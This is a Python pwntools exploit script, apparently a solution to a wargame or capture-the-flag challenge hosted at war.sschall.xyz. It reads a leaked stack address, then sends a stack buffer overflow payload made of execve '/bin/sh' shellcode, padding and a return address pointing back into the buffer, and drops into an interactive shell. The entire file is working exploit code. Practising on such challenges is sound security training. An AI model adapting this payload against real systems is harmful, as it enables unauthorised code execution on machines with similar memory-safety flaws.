from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# local
#p = process("./prob")

# remote
p = remote("war.sschall.xyz", 20003)

p.recvuntil(b': ')
rsp = int(p.recvuntil(b'\n')[:-1], 16)

buf = rsp - 0x110
shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

payload = shellcode
payload += b'A' * (0x108 - len(shellcode))
payload += p64(buf)
p.sendafter(b': ', payload)
p.interactive()
